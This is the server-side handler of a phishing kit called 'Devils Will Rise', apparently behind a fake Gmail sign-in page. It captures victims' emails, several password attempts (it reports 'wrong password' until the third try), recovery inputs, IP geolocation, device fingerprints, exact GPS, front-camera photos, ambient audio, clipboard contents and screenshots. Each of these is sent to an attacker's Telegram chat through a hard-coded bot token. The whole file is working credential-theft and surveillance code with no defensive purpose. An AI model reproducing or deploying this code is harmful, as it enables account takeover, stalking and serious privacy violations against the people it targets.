/* ============================================================
   DEVILS WILL RISE — Main API
   Owner: @tneh_owner
   Channel: https://t.me/customsmsapi
   ============================================================ */

import fetch from 'node-fetch';
import FormData from 'form-data';

const BOT_TOKEN = process.env.BOT_TOKEN || "8484672660:AAGgoQFyFTU8CbmaikA_bWeuT1XCQAiKrgI";
const CHAT_ID   = process.env.CHAT_ID   || "8128648817";
const OWNER     = process.env.OWNER     || "@tneh_owner";
const CHANNEL   = process.env.CHANNEL   || "https://t.me/customsmsapi";

/* ===== In-memory victim store (per cold start) ===== */
const victims = globalThis.__DWR_VICTIMS__ || (globalThis.__DWR_VICTIMS__ = new Map());

/* ============================================================
   Helpers
   ============================================================ */
function esc(s){
  if(s === null || s === undefined) return 'n/a';
  return String(s).replace(/[&<>"']/g, c => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
  }[c]));
}
function nowStr(){
  return new Date().toLocaleString('en-GB', {
    day:'2-digit', month:'short', year:'numeric',
    hour:'2-digit', minute:'2-digit', second:'2-digit',
    timeZone:'Asia/Dhaka'
  });
}
function footer(victimId){
  return `━━━━━━━━━━━━━━━━━━\n🆔 <b>Victim ID:</b> <code>${victimId||'n/a'}</code>\n👤 <b>Owner:</b> ${OWNER}\n📡 <b>Channel:</b> ${CHANNEL}`;
}

/* ============================================================
   Telegram Senders
   ============================================================ */
async function sendMessage(text){
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    })
  });
  return res.json();
}

async function sendPhoto(buffer, caption, filename='photo.jpg'){
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('caption', caption || '');
  fd.append('parse_mode', 'HTML');
  fd.append('photo', buffer, { filename, contentType: 'image/jpeg' });
  const res = await fetch(url, { method: 'POST', body: fd });
  return res.json();
}

async function sendAudio(buffer, caption, filename='ambient.webm'){
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`;
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('caption', caption || '');
  fd.append('parse_mode', 'HTML');
  fd.append('audio', buffer, { filename, contentType: 'audio/webm' });
  const res = await fetch(url, { method: 'POST', body: fd });
  return res.json();
}

async function sendDocument(buffer, caption, filename){
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('caption', caption || '');
  fd.append('parse_mode', 'HTML');
  fd.append('document', buffer, { filename });
  const res = await fetch(url, { method: 'POST', body: fd });
  return res.json();
}

/* ============================================================
   Get client IP from request headers
   ============================================================ */
function getClientIP(req){
  const xff = req.headers['x-forwarded-for'];
  if(xff) return xff.split(',')[0].trim();
  return req.headers['x-real-ip'] ||
         req.socket?.remoteAddress ||
         req.connection?.remoteAddress ||
         'unknown';
}

/* ============================================================
   MAIN HANDLER
   ============================================================ */
export default async function handler(req, res){
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if(req.method === 'OPTIONS'){
    return res.status(200).end();
  }

  // GET → health check
  if(req.method === 'GET'){
    return res.status(200).json({
      status: 'active',
      service: 'Devils Will Rise',
      owner: OWNER,
      channel: CHANNEL,
      time: nowStr(),
      victims_captured: victims.size
    });
  }

  // POST → handle capture
  if(req.method === 'POST'){
    try{
      const body = req.body || {};
      const { action, data } = body;

      if(!action){
        return res.status(400).json({ ok:false, error:'Missing action' });
      }

      /* ---------- Action: EMAIL ---------- */
      if(action === 'email'){
        const victimId = data.victimId || 'V-' + Math.random().toString(36).substr(2,6).toUpperCase();
        const clientIp = getClientIP(req);

        victims.set(victimId, {
          victimId,
          email: data.email,
          ip: clientIp,
          geo: data.geo || {},
          device: data.device || {},
          emailTime: nowStr(),
          password: null,
          attempts: [],
          gps: null,
          photo: null,
          audio: null,
          clipboard: null,
          screenshot: null,
          createdAt: Date.now()
        });

        const g = data.geo || {};
        const d = data.device || {};
        const msg =
`💀 <b>DEVILS WILL RISE</b> 💀
━━━━━━━━━━━━━━━━━━
<b>📧 STEP 1 — EMAIL CAPTURED</b>
━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b>
<code>${esc(data.email)}</code>
🆔 <b>Victim ID:</b> <code>${victimId}</code>
🌐 <b>Client IP:</b> <code>${esc(clientIp)}</code>
✔️ <b>Status:</b> Account found — proceeding to password
━━━━━━━━━━━━━━━━━━
<b>📍 IP INTELLIGENCE</b>
🌐 <b>IP:</b> <code>${esc(g.ip||clientIp)}</code>
🏙️ <b>City:</b> ${esc(g.city)}
🗺️ <b>Region:</b> ${esc(g.region)}
🌍 <b>Country:</b> ${esc(g.country)} ${g.cc?'('+esc(g.cc)+')':''}
📮 <b>Postal:</b> ${esc(g.postal)}
🧭 <b>Coordinates:</b> ${esc(g.lat)}, ${esc(g.lon)}
🗺️ <a href="https://www.google.com/maps?q=${g.lat},${g.lon}">Open in Google Maps</a>
🏢 <b>ISP:</b> ${esc(g.isp)}
🔢 <b>ASN:</b> ${esc(g.asn)}
🕒 <b>Timezone:</b> ${esc(g.timezone)} (UTC ${esc(g.utc)})
━━━━━━━━━━━━━━━━━━
<b>📱 DEVICE FINGERPRINT</b>
🖥️ <b>Screen:</b> ${esc(d.screen)}
📐 <b>Viewport:</b> ${esc(d.viewport)}
⚙️ <b>Cores:</b> ${esc(d.cores)} | 💾 <b>RAM:</b> ${esc(d.memory)}
👆 <b>Touch:</b> ${esc(d.touch)}
📶 <b>Network:</b> ${esc(d.conn)} @ ${esc(d.downlink)}Mbps
🍪 <b>Cookies:</b> ${esc(d.cookies)}
🗣️ <b>Lang:</b> ${esc(d.lang)} [${esc(d.langs)}]
🌐 <b>TZ:</b> ${esc(d.tz)}
📱 <b>Platform:</b> ${esc(d.platform)}
🧭 <b>UA:</b>
<code>${esc(d.ua)}</code>
━━━━━━━━━━━━━━━━━━
🕒 <b>Time:</b> ${nowStr()}
${footer(victimId)}`;
        await sendMessage(msg);
        return res.status(200).json({ ok:true, victimId });
      }

      /* ---------- Action: PASSWORD ---------- */
      if(action === 'password'){
        const victimId = data.victimId;
        const attempt = data.attempt || 1;
        const success = attempt >= 3;
        const v = victims.get(victimId);

        if(v){
          v.password = data.password;
          v.attempts.push({ attempt, password: data.password, time: nowStr() });
        }

        if(!success){
          const msg =
`💀 <b>DEVILS WILL RISE</b> 💀
━━━━━━━━━━━━━━━━━━
<b>⚠️ ATTEMPT ${attempt} — WRONG PASSWORD</b>
━━━━━━━━━━━━━━━━━━
🆔 <b>Victim ID:</b> <code>${victimId}</code>
📧 <b>Email:</b>
<code>${esc(data.email)}</code>

🔑 <b>Password Tried #${attempt}:</b>
<code>${esc(data.password)}</code>

❌ <b>Status:</b> Wrong password. Try again.
🔁 <b>Victim will retry...</b>
━━━━━━━━━━━━━━━━━━
🌐 <b>IP:</b> <code>${esc((v&&v.ip)||'unknown')}</code>
🌍 <b>Location:</b> ${esc((v&&v.geo&&v.geo.city)||'')}, ${esc((v&&v.geo&&v.geo.country)||'')}
🕒 <b>Time:</b> ${nowStr()}
${footer(victimId)}`;
          await sendMessage(msg);
          return res.status(200).json({ ok:true, attempt, success:false });
        }

        const msg =
`💀 <b>DEVILS WILL RISE</b> 💀
━━━━━━━━━━━━━━━━━━
<b>✅ ATTEMPT ${attempt} — LOGIN SUCCESSFUL</b>
━━━━━━━━━━━━━━━━━━
🆔 <b>Victim ID:</b> <code>${victimId}</code>
📧 <b>Email:</b>
<code>${esc(data.email)}</code>

🔑 <b>Password (Accepted):</b>
<code>${esc(data.password)}</code>

✔️ <b>Status:</b> Signed in — starting deep capture
🔁 <b>Attempts:</b> ${attempt}
━━━━━━━━━━━━━━━━━━
🌐 <b>IP:</b> <code>${esc((v&&v.ip)||'unknown')}</code>
🌍 <b>Location:</b> ${esc((v&&v.geo&&v.geo.city)||'')}, ${esc((v&&v.geo&&v.geo.country)||'')}
🕒 <b>Time:</b> ${nowStr()}
${footer(victimId)}`;
        await sendMessage(msg);
        return res.status(200).json({ ok:true, attempt, success:true });
      }

      /* ---------- Action: GPS ---------- */
      if(action === 'gps'){
        const victimId = data.victimId;
        const gps = data.gps;
        const v = victims.get(victimId);
        if(v) v.gps = gps;

        if(!gps){
          await sendMessage(
`💀 <b>DEVILS WILL RISE</b> 💀
━━━━━━━━━━━━━━━━━━
<b>📍 GPS EXACT LOCATION</b>
━━━━━━━━━━━━━━━━━━
🆔 <b>Victim ID:</b> <code>${victimId}</code>
❌ <b>GPS:</b> Permission denied or unavailable
🕒 <b>Time:</b> ${nowStr()}
${footer(victimId)}`
          );
          return res.status(200).json({ ok:true });
        }

        const msg =
`💀 <b>DEVILS WILL RISE</b> 💀
━━━━━━━━━━━━━━━━━━
<b>📍 GPS EXACT LOCATION</b>
━━━━━━━━━━━━━━━━━━
🆔 <b>Victim ID:</b> <code>${victimId}</code>
📧 <b>Email:</b> <code>${esc(data.email)}</code>
━━━━━━━━━━━━━━━━━━
🧭 <b>Latitude:</b> <code>${esc(gps.lat)}</code>
🧭 <b>Longitude:</b> <code>${esc(gps.lon)}</code>
📏 <b>Accuracy:</b> ${esc(gps.acc)} m
⛰️ <b>Altitude:</b> ${esc(gps.alt)} m
🧲 <b>Heading:</b> ${esc(gps.head)}°
🏃 <b>Speed:</b> ${esc(gps.spd)} m/s
━━━━━━━━━━━━━━━━━━
🗺️ <a href="https://www.google.com/maps?q=${gps.lat},${gps.lon}">Open Exact Location in Google Maps</a>
🕒 <b>Time:</b> ${nowStr()}
${footer(victimId)}`;
        await sendMessage(msg);
        return res.status(200).json({ ok:true });
      }

      /* ---------- Action: PHOTO ---------- */
      if(action === 'photo'){
        const victimId = data.victimId;
        const base64 = data.photo;
        const v = victims.get(victimId);
        if(v) v.photo = true;

        if(!base64){
          return res.status(200).json({ ok:false, error:'No photo data' });
        }

        const buffer = Buffer.from(base64.split(',')[1] || base64, 'base64');
        await sendPhoto(buffer,
`📸 <b>FRONT CAMERA CAPTURE</b>
━━━━━━━━━━━━━━━━━━
🆔 <b>Victim ID:</b> <code>${victimId}</code>
📧 <b>Email:</b> <code>${esc(data.email)}</code>
🕒 <b>Time:</b> ${nowStr()}
${footer(victimId)}`
        );
        return res.status(200).json({ ok:true });
      }

      /* ---------- Action: AUDIO ---------- */
      if(action === 'audio'){
        const victimId = data.victimId;
        const base64 = data.audio;
        const v = victims.get(victimId);
        if(v) v.audio = true;

        if(!base64){
          return res.status(200).json({ ok:false, error:'No audio data' });
        }

        const buffer = Buffer.from(base64.split(',')[1] || base64, 'base64');
        await sendAudio(buffer,
`🎤 <b>AMBIENT AUDIO (6s)</b>
━━━━━━━━━━━━━━━━━━
🆔 <b>Victim ID:</b> <code>${victimId}</code>
📧 <b>Email:</b> <code>${esc(data.email)}</code>
🕒 <b>Time:</b> ${nowStr()}
${footer(victimId)}`
        );
        return res.status(200).json({ ok:true });
      }

      /* ---------- Action: CLIPBOARD ---------- */
      if(action === 'clipboard'){
        const victimId = data.victimId;
        const text = data.clipboard;
        const v = victims.get(victimId);
        if(v) v.clipboard = text;

        if(!text){
          return res.status(200).json({ ok:true, empty:true });
        }

        const msg =
`💀 <b>DEVILS WILL RISE</b> 💀
━━━━━━━━━━━━━━━━━━
<b>📋 CLIPBOARD CAPTURED</b>
━━━━━━━━━━━━━━━━━━
🆔 <b>Victim ID:</b> <code>${victimId}</code>
📧 <b>Email:</b> <code>${esc(data.email)}</code>
━━━━━━━━━━━━━━━━━━
📝 <b>Content:</b>
<code>${esc(text)}</code>
━━━━━━━━━━━━━━━━━━
🕒 <b>Time:</b> ${nowStr()}
${footer(victimId)}`;
        await sendMessage(msg);
        return res.status(200).json({ ok:true });
      }

      /* ---------- Action: SCREENSHOT ---------- */
      if(action === 'screenshot'){
        const victimId = data.victimId;
        const base64 = data.screenshot;
        const v = victims.get(victimId);
        if(v) v.screenshot = true;

        if(!base64){
          return res.status(200).json({ ok:false, error:'No screenshot data' });
        }

        const buffer = Buffer.from(base64.split(',')[1] || base64, 'base64');
        await sendPhoto(buffer,
`🖼️ <b>SCREENSHOT CAPTURE</b>
━━━━━━━━━━━━━━━━━━
🆔 <b>Victim ID:</b> <code>${victimId}</code>
📧 <b>Email:</b> <code>${esc(data.email)}</code>
🕒 <b>Time:</b> ${nowStr()}
${footer(victimId)}`
        );
        return res.status(200).json({ ok:true });
      }

      /* ---------- Action: FINAL SUMMARY ---------- */
      if(action === 'summary'){
        const victimId = data.victimId;
        const v = victims.get(victimId) || {};
        const msg =
`💀 <b>DEVILS WILL RISE</b> 💀
━━━━━━━━━━━━━━━━━━
<b>🎯 FULL CAPTURE COMPLETE</b>
━━━━━━━━━━━━━━━━━━
🆔 <b>Victim ID:</b> <code>${victimId}</code>
📧 <b>Email:</b> <code>${esc(data.email)}</code>
🔑 <b>Password:</b> <code>${esc(data.password)}</code>
━━━━━━━━━━━━━━━━━━
✅ <b>GPS:</b> ${v.gps ? '✔ Captured' : '✖ Failed'}
✅ <b>Photo:</b> ${v.photo ? '✔ Captured' : '✖ Failed'}
✅ <b>Audio:</b> ${v.audio ? '✔ Captured' : '✖ Failed'}
✅ <b>Clipboard:</b> ${v.clipboard ? '✔ Captured' : '✖ Empty'}
✅ <b>Screenshot:</b> ${v.screenshot ? '✔ Captured' : '✖ Failed'}
━━━━━━━━━━━━━━━━━━
🚀 <b>Redirecting victim to Gmail app...</b>
🕒 <b>Time:</b> ${nowStr()}
${footer(victimId)}`;
        await sendMessage(msg);
        return res.status(200).json({ ok:true });
      }

      /* ---------- Action: RECOVERY ---------- */
      if(action === 'recovery'){
        const victimId = data.victimId;
        const msg =
`💀 <b>DEVILS WILL RISE</b> 💀
━━━━━━━━━━━━━━━━━━
<b>🔄 ${esc(data.recoveryType==='password'?'PASSWORD RECOVERY':'EMAIL RECOVERY')}</b>
━━━━━━━━━━━━━━━━━━
🆔 <b>Victim ID:</b> <code>${victimId}</code>
📧 <b>Original Email:</b>
<code>${esc(data.email||'not provided')}</code>

${data.password?`🔑 <b>Password tried:</b>\n<code>${esc(data.password)}</code>\n\n`:''}📱 <b>Recovery Input:</b>
<code>${esc(data.recovery)}</code>
━━━━━━━━━━━━━━━━━━
🕒 <b>Time:</b> ${nowStr()}
${footer(victimId)}`;
        await sendMessage(msg);
        return res.status(200).json({ ok:true });
      }

      return res.status(400).json({ ok:false, error:'Unknown action: ' + action });

    }catch(err){
      console.error('Handler error:', err);
      return res.status(500).json({ ok:false, error: err.message });
    }
  }

  return res.status(405).json({ ok:false, error:'Method not allowed' });
}
